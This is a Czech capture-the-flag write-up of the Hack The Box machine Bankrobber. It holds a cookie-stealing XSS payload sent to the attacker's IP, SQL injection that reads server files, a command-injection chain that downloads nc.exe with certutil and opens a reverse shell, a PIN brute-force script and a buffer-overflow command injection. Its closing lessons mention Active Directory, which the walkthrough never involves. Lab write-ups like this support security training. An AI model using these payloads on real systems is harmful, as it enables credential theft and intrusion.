---
layout: post
author: Tomáš Matějíček
title: "Bankrobber"
date: 2019-11-28
tags: windows xss sql-injection command-injection brute-force buffer-overflow
---

## Úvod a kontext

Bankrobber je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.

```bash
IP=10.10.10.154;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP
```
```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 55m24s, deviation: 0s, median: 55m24s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-28T20:28:48
|_  start_date: 2019-11-28T20:22:49

```

### Prohlídka webové aplikace

```text
http://10.10.10.154
```
- Registrovat
- Zkontrolovat cookies
```
document.cookie
"id=3; username=YWFh; password=YWFh"
```
- Jméno a heslo je uloženo v cookies v base64
- Žádosti o transfer e-coinu schvaluje správce

### Zneužití XSS zranitelnosti ve formuláři pro transfer e-coinu

```bash
nc -lvp 8000
```
Odeslání formuláře s následujícím komentářem (IP.AD.RE.SA nahradit vlastní IP) a počkat
```bash
<img src="not-found-img.jpg" onerror=this.src='http://IP.AD.RE.SA:8000/?cookie='+document.cookie>
```

```
listening on [any] 8000 ...
connect to [10.10.14.11] from Bankrobber.htb [10.10.10.154] 49811
GET /?cookie=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: nl-NL,en,*

```

### Dekódování přihlašovacích údajů správce

Uživatelské jméno:
```
input="YWRtaW4%3D";printf '%b' "${input//%/\\x}" | base64 -d
admin
```
Heslo:
```
input="SG9wZWxlc3Nyb21hbnRpYw%3D%3D";printf '%b' "${input//%/\\x}" | base64 -d
Hopelessromantic
```

### Prohlídka webové aplikace z pohledu správce

- Schvalování transakcí
- Vyhledávání uživatelů (http://10.10.10.154/admin/search.php)
- Zobrazení obsahu adresáře (spustitelné jen z localhost) (http://10.10.10.154/admin/backdoorchecker.php)
- http://10.10.10.154/notes.txt
```
- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..
```

### Test SQL injection ve vyhledávání uživatelů

- `1' UNION SELECT 1,user(),3-- -`
- `1' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3-- -`

### Načtení obsahu backdoorchecker.php z výchozí složky Xampp

- `1' UNION SELECT 1,LOAD_FILE('C:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -`

Obsah se lépe čte pomocí Developer tools prohlížeče na záložce Network

```php
<?php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
			// FILTER ESCAPE CHARS
			foreach($bad as $char){
				if(strpos($_POST['cmd'],$char) !== false){
					die("You're not allowed to do that.");
				}
			}
			// CHECK IF THE FIRST 2 CHARS ARE LS
			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
				die("It's only allowed to use the $good command");
			}

			if($_SERVER['REMOTE_ADDR'] == "::1"){
				system($_POST['cmd']);
			} else{
				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
			}
	}
} else{
	echo "You are not allowed to use this function!";
}
?>
```
Skript je zranitelný na Command Injection

### Kombinace XSS a Command Injection

Spuštění primitivního webového serveru

```bash
python -m SimpleHTTPServer 8000
```

Příprava netcatu

```bash
nc -lvp 4000
```

Odeslání formuláře s následujícím komentářem (IP.AD.RE.SA nahradit vlastní IP) a počkat
Skript stáhne nc.exe a otevře reverzní shell
```js
<script>
	function mycallSys(cmd){
		var http=new XMLHttpRequest();
		var params='cmd='+cmd;
		http.open('POST','backdoorchecker.php',true);
		http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
		http.withCredentials = true;
		http.send(params);
	};
	mycallSys('dir|certutil.exe -urlcache -split -f http://10.10.14.11:8000/nc.exe c:\\windows\\temp\\nc.exe | c:\\windows\\temp\\nc.exe 10.10.14.11 4000 -e cmd');
</script>
```

## Získání přístupu

### Zobrazení obsahu souboru user.txt

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

```
C:\Users\Cortin\Desktop>more user.txt
more user.txt
__CENSORED__
```

### Výpis naslouchajících služeb

```
netstat -ano | findstr LISTEN
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1992
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       740
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       1992
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1456
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       2556
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       460
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       876
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1332
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       576
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       588
  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       1992
  TCP    [::]:135               [::]:0                 LISTENING       740
  TCP    [::]:443               [::]:0                 LISTENING       1992
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3306              [::]:0                 LISTENING       2556
  TCP    [::]:49664             [::]:0                 LISTENING       460
  TCP    [::]:49665             [::]:0                 LISTENING       904
  TCP    [::]:49666             [::]:0                 LISTENING       876
  TCP    [::]:49667             [::]:0                 LISTENING       1332
  TCP    [::]:49668             [::]:0                 LISTENING       576
  TCP    [::]:49669             [::]:0                 LISTENING       588
```
Port 910 není běžný, vyžaduje větší pozornost...
```text
tasklist
```
```
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
...
bankv2.exe                    1456                            0         96 K
...
```
```text
c:\windows\temp\nc.exe localhost 910
```
```
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$]
```

### Rozlousknutí PINu

PowerShell skript brute.ps1 připravíme do stejné složky jako nc.exe
```powershell
[int] $Port = 910
$IP = "127.0.0.1"
$Address = [system.net.IPAddress]::Parse($IP) 
$End = New-Object System.Net.IPEndPoint $address, $port 
$Stype = [System.Net.Sockets.SocketType]::Stream
$Ptype = [System.Net.Sockets.ProtocolType]::TCP

For ($i=0; $i -le 1000; $i++) {
	$code = $i.ToString();
	$bytecode = [system.Text.Encoding]::ASCII.GetBytes($code.PadLeft(4,"0")+"`n")
	
	$Sock = New-Object System.Net.Sockets.Socket $stype, $ptype 
	$sock.Connect($end)
	Start-Sleep -Milliseconds 100
	
	$buf = new-object byte[] $Sock.Available
	$receive = $Sock.Receive($buf)
	
	$Sent = $Sock.Send($bytecode)
	Start-Sleep -Milliseconds 100
	
	$buf = new-object byte[] $Sock.Available
	$receive = $Sock.Receive($buf);
	if ($receive -gt 45){
		"PIN: {0}" -f [System.Text.Encoding]::ASCII.GetString($bytecode)
		return
	}
	
	$Sock.Close()
}
```
Spuštění skriptu:
```
PowerShell.exe -ExecutionPolicy Bypass
wget http://10.10.14.11:8000/brute.ps1 -outfile brute.ps1
.\brute.ps1
```
```text
PIN: 0021
```

### Připojení ke službě a použití PINu

```text
c:\windows\temp\nc.exe localhost 910
```
```
0021
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 100
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 
 [$] Transfering $100 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
```
Služba spouští transfer.exe, volání by mohlo být zranitelné na buffer overflow.

### Test buffer overflow

```text
c:\windows\temp\nc.exe localhost 910
```
```text
0021
```
```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
```
[$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Potvrzeno: služba je zranitelná na buffer overflow

### Zneužití zranitelnosti buffer overflow

Příprava netcatu
```bash
nc -lvp 4001
```

```text
c:\windows\temp\nc.exe localhost 910
```
```text
0021
```
```text
99999999999999999999999999999999c:\windows\temp\nc.exe IP.AD.RE.SA 4001 -e cmd
```

### Vypsání obsahu souboru root.txt

```
more c:\users\admin\desktop\root.txt
__CENSORED__
```

## Shrnutí klíčových poznatků

- Rozhodující byla síťová a doménová enumerace, protože právě z dostupných služeb a sdílení vzešly další identity nebo tajné údaje.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.

## Co si odnést do praxe

- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
- V prostředí Active Directory je klíčové hlídat oprávnění ke sdílením, servisním účtům a delegacím; i malý únik informací se snadno řetězí do dalších kroků.
- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
